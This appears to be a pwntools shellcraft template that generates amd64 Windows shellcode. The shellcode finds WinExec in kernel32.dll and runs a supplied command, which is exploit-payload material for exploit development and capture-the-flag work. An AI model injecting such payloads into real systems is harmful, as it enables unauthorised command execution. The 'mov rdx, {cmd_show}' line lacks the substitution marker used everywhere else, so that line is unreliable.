<%
    from pwnlib.shellcraft import amd64, pretty
    from pwnlib.util.packing import _need_bytes
    from pwnlib.util.misc import align
%>
<%docstring>Execute a program using WinExec.

Args:
    cmd (str): The program to execute.
</%docstring>
<%page args="cmd, cmd_show = 0"/>
<%
cmd = _need_bytes(cmd)
pad = align(8, len(cmd) + 1) // 8 % 2 ^ 1 * 8
%>

    ${amd64.windows.getprocaddress(b'WinExec', b'kernel32.dll', 'rsi')}
    ${amd64.pushstr(cmd)}
    mov rcx, rsp
    sub rsp, ${pretty(0x30+pad)}
    mov rdx, {cmd_show}
    call rsi
    add rsp, ${pretty(0x30+align(8, len(cmd)+1)+pad)}
